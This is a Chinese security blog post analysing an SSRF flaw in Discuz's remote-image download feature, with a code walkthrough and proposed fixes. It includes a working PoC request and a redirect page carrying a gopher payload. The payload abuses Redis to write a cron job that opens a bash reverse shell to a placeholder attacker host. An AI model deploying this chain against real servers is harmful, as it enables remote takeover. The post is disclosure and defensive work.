<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> discuz最新版20160601 SSRF漏洞分析及修复方案 · xd_xd's blog</title><meta name="description" content="discuz最新版20160601 SSRF漏洞分析及修复方案 - xd_xd"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.ico"><link rel="stylesheet" href="/css/apollo.css"><script src="/js/jquery-3.1.0.min.js"></script><script src="/js/jquery.goup.js"></script><script src="/js/goup.js"></script><link rel="search" type="application/opensearchdescription+xml" href="http://xdxd.love/atom.xml" title="xd_xd's blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/logo.jpg"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://github.com/stayliv3" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/archives" target="_self" class="nav-list-link">ARCHIVES</a></li><li class="nav-list-item"><a href="/friends" target="_self" class="nav-list-link">FRIENDS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">discuz最新版20160601 SSRF漏洞分析及修复方案</h1><div class="post-info">Oct 19, 2016</div><div class="post-content"><h2 id="参考资料">参考资料</h2><p><a href="http://wufeifei.com/ssrf/" target="_blank" rel="external">SSRF到GET SHELL</a><br>wooyun:wooyun-2015-0151179</p>
<h2 id="漏洞poc">漏洞poc</h2><p>访问：<br>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]<a href="http://23.88.58.149/1.jpg[/img]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6" target="_blank" rel="external">http://23.88.58.149/1.jpg[/img]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6</a></p>
<p>需要带formhash，也可以post方式请求。</p>
<p>discuz有个远程下载图片的功能。虽然有些版本编辑器没有显示远程下载图片的按钮，但是可能也存在这个方法。可以直接通过poc进行验证</p>
<p><img src="/images/discuzssrf2.png" alt=""></p>
<p>可以利用301跳转绕过discuz waf的限制，成为一个无限制的curl ssrf。</p>
<h2 id="代码分析">代码分析</h2><p>source/module/forum/forum_ajax.php</p>
<p>374行:</p>
<pre><code>} <span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">'action'</span>] == <span class="string">'downremoteimg'</span>) {
    <span class="variable">$_GET</span>[<span class="string">'message'</span>] = str_replace(<span class="keyword">array</span>(<span class="string">"\r"</span>, <span class="string">"\n"</span>), <span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">'wysiwyg'</span>] ? <span class="string">'&lt;br /&gt;'</span> : <span class="string">''</span>, <span class="string">"\\n"</span>), <span class="variable">$_GET</span>[<span class="string">'message'</span>]);
    preg_match_all(<span class="string">"/\[img\]\s*([^\[\&lt;\r\n]+?)\s*\[\/img\]|\[img=\d{1,4}[x|\,]\d{1,4}\]\s*([^\[\&lt;\r\n]+?)\s*\[\/img\]/is"</span>, <span class="variable">$_GET</span>[<span class="string">'message'</span>], <span class="variable">$image1</span>, PREG_SET_ORDER);
    preg_match_all(<span class="string">"/\&lt;img.+src=('|\"|)?(.*)(\\1)([\s].*)?\&gt;/ismUe"</span>, <span class="variable">$_GET</span>[<span class="string">'message'</span>], <span class="variable">$image2</span>, PREG_SET_ORDER);
    <span class="variable">$temp</span> = <span class="variable">$aids</span> = <span class="variable">$existentimg</span> = <span class="keyword">array</span>();
    <span class="keyword">if</span>(is_array(<span class="variable">$image1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$image1</span>)) {
        <span class="keyword">foreach</span>(<span class="variable">$image1</span> <span class="keyword">as</span> <span class="variable">$value</span>) {
            <span class="variable">$temp</span>[] = <span class="keyword">array</span>(
                <span class="string">'0'</span> =&gt; <span class="variable">$value</span>[<span class="number">0</span>],
                <span class="string">'1'</span> =&gt; trim(!<span class="keyword">empty</span>(<span class="variable">$value</span>[<span class="number">1</span>]) ? <span class="variable">$value</span>[<span class="number">1</span>] : <span class="variable">$value</span>[<span class="number">2</span>])
            );
        }
    }
    <span class="keyword">if</span>(is_array(<span class="variable">$image2</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$image2</span>)) {
        <span class="keyword">foreach</span>(<span class="variable">$image2</span> <span class="keyword">as</span> <span class="variable">$value</span>) {
            <span class="variable">$temp</span>[] = <span class="keyword">array</span>(
                <span class="string">'0'</span> =&gt; <span class="variable">$value</span>[<span class="number">0</span>],
                <span class="string">'1'</span> =&gt; trim(<span class="variable">$value</span>[<span class="number">2</span>])
            );
        }
    }
    <span class="keyword">require_once</span> libfile(<span class="string">'class/image'</span>);
    <span class="keyword">if</span>(is_array(<span class="variable">$temp</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$temp</span>)) {
        <span class="variable">$upload</span> = <span class="keyword">new</span> discuz_upload();
        <span class="variable">$attachaids</span> = <span class="keyword">array</span>();

        <span class="keyword">foreach</span>(<span class="variable">$temp</span> <span class="keyword">as</span> <span class="variable">$value</span>) {
            <span class="variable">$imageurl</span> = <span class="variable">$value</span>[<span class="number">1</span>];
            <span class="variable">$hash</span> = md5(<span class="variable">$imageurl</span>);
            <span class="keyword">if</span>(strlen(<span class="variable">$imageurl</span>)) {
                <span class="variable">$imagereplace</span>[<span class="string">'oldimageurl'</span>][] = <span class="variable">$value</span>[<span class="number">0</span>];
                <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$existentimg</span>[<span class="variable">$hash</span>])) {
                    <span class="variable">$existentimg</span>[<span class="variable">$hash</span>] = <span class="variable">$imageurl</span>;
                    <span class="variable">$attach</span>[<span class="string">'ext'</span>] = <span class="variable">$upload</span>-&gt;fileext(<span class="variable">$imageurl</span>);
                    <span class="keyword">if</span>(!<span class="variable">$upload</span>-&gt;is_image_ext(<span class="variable">$attach</span>[<span class="string">'ext'</span>])) {
                        <span class="keyword">continue</span>;
                    }
                    <span class="variable">$content</span> = <span class="string">''</span>;
                    <span class="keyword">if</span>(preg_match(<span class="string">'/^(http:\/\/|\.)/i'</span>, <span class="variable">$imageurl</span>)) {
                        <span class="variable">$content</span> = dfsockopen(<span class="variable">$imageurl</span>);
</code></pre><p>imageurl最后进入dfsockopen。跟进dfsockopen.</p>
<p>定位到最后发出请求的函数：<br>source/function/function_filesock.php</p>
<pre><code><span class="keyword">function</span> _dfsockopen(<span class="variable">$url</span>, <span class="variable">$limit</span> = <span class="number">0</span>, <span class="variable">$post</span> = <span class="string">''</span>, <span class="variable">$cookie</span> = <span class="string">''</span>, <span class="variable">$bysocket</span> = FALSE, <span class="variable">$ip</span> = <span class="string">''</span>, <span class="variable">$timeout</span> = <span class="number">15</span>, <span class="variable">$block</span> = TRUE, <span class="variable">$encodetype</span>  = <span class="string">'URLENCODE'</span>, <span class="variable">$allowcurl</span> = TRUE, <span class="variable">$position</span> = <span class="number">0</span>, <span class="variable">$files</span> = <span class="keyword">array</span>()) {
    <span class="variable">$return</span> = <span class="string">''</span>;
    <span class="variable">$matches</span> = parse_url(<span class="variable">$url</span>);
    <span class="variable">$scheme</span> = <span class="variable">$matches</span>[<span class="string">'scheme'</span>];
    <span class="variable">$host</span> = <span class="variable">$matches</span>[<span class="string">'host'</span>];
    <span class="variable">$path</span> = <span class="variable">$matches</span>[<span class="string">'path'</span>] ? <span class="variable">$matches</span>[<span class="string">'path'</span>].(<span class="variable">$matches</span>[<span class="string">'query'</span>] ? <span class="string">'?'</span>.<span class="variable">$matches</span>[<span class="string">'query'</span>] : <span class="string">''</span>) : <span class="string">'/'</span>;
    <span class="variable">$port</span> = !empty(<span class="variable">$matches</span>[<span class="string">'port'</span>]) ? <span class="variable">$matches</span>[<span class="string">'port'</span>] : (<span class="variable">$scheme</span> == <span class="string">'http'</span> ? <span class="string">'80'</span> : <span class="string">''</span>);
    <span class="variable">$boundary</span> = <span class="variable">$encodetype</span> == <span class="string">'URLENCODE'</span> ? <span class="string">''</span> : random(<span class="number">40</span>);

    if(<span class="variable">$post</span>) {
        if(!is_array(<span class="variable">$post</span>)) {
            parse_str(<span class="variable">$post</span>, <span class="variable">$post</span>);
        }
        _format_postkey(<span class="variable">$post</span>, <span class="variable">$postnew</span>);
        <span class="variable">$post</span> = <span class="variable">$postnew</span>;
    }
    if(function_exists(<span class="string">'curl_init'</span>) &amp;&amp; function_exists(<span class="string">'curl_exec'</span>) &amp;&amp; <span class="variable">$allowcurl</span>) {
        <span class="variable">$ch</span> = curl_init();
        <span class="variable">$httpheader</span> = array();
        if(<span class="variable">$ip</span>) {
            <span class="variable">$httpheader</span>[] = <span class="string">"Host: "</span>.<span class="variable">$host</span>;
        }
        if(<span class="variable">$httpheader</span>) {
            curl_setopt(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$httpheader</span>);
        }
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$scheme</span>.<span class="string">'://'</span>.(<span class="variable">$ip</span> ? <span class="variable">$ip</span> : <span class="variable">$host</span>).(<span class="variable">$port</span> ? <span class="string">':'</span>.<span class="variable">$port</span> : <span class="string">''</span>).<span class="variable">$path</span>);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, true);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);
</code></pre><p>使用curl来发出http。而curl支持非常多的协议。<br><img src="/images/discuzssrf3.png" alt=""></p>
<h2 id="漏洞利用">漏洞利用</h2><p>编写一个跳转页面：</p>
<pre><code>&lt;?php  
header(<span class="string">"Location: gopher://127.0.0.1:6379/_*1<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$8</span><span class="variable">%0d</span><span class="variable">%0aflushall</span><span class="variable">%0d</span><span class="variable">%0a</span>*3<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0aset</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$1</span><span class="variable">%0d</span><span class="variable">%0a1</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$6</span>4<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span>*/1<span class="variable">%20</span>*<span class="variable">%20</span>*<span class="variable">%20</span>*<span class="variable">%20</span>*<span class="variable">%20bash</span><span class="variable">%20</span>-i<span class="variable">%20</span>&gt;&amp;<span class="variable">%20</span>/dev/tcp/{your_server}/{your_server_listen_port}<span class="variable">%200</span>&gt;&amp;1<span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span>*4<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$6</span><span class="variable">%0d</span><span class="variable">%0aconfig</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0aset</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0adir</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$1</span>6<span class="variable">%0d</span><span class="variable">%0a</span>/var/spool/cron/<span class="variable">%0d</span><span class="variable">%0a</span>*4<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$6</span><span class="variable">%0d</span><span class="variable">%0aconfig</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0aset</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$1</span>0<span class="variable">%0d</span><span class="variable">%0adbfilename</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$4</span><span class="variable">%0d</span><span class="variable">%0aroot</span><span class="variable">%0d</span><span class="variable">%0a</span>*1<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$4</span><span class="variable">%0d</span><span class="variable">%0asave</span><span class="variable">%0d</span><span class="variable">%0aquit</span><span class="variable">%0d</span><span class="variable">%0a</span>"</span>)
?&gt;
</code></pre><p>poc:</p>
<pre><code>forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]<span class="link_url">http://127.0.0.1:8054/test/301.php?1.jpg</span>[<span class="link_label">/img</span>]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6&amp;posttime=1476777238&amp;wysiwyg=1&amp;subject=test&amp;unused%5B%5D=1
</code></pre><p>服务器本地监听6379端口，可以看到gopher协议成功请求。</p>
<p><img src="/images/discuzssrf4.png" alt=""></p>
<h2 id="补丁分析">补丁分析</h2><p>目前discuz没有修复这个问题。不过经过测试，discuz官方论坛是关闭了这个功能的。</p>
<h2 id="修复方案">修复方案</h2><p>1，建议直接关闭远程下载图片这个功能。<br>2，在_dfsockopen方法内增加</p>
<pre><code>curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); 
</code></pre><p>将协议限制为http/https可以降低这个SSRF的危害。</p>
</div></article></div></section><footer><div class="paginator"><a href="/2016/11/19/一个简单的mips架构缓冲区溢出分析/" class="prev">上一篇</a><a href="/2016/10/18/对称NAT穿透的一种新方法/" class="next">下一篇</a></div><div class="copyright"><p>© 2016 <a href="http://xdxd.love">xd_xd</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/hkalexling/Yuno-Apollo" target="_blank">Yuno-Apollo</a>.</p></div></footer></div><script src="https://cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>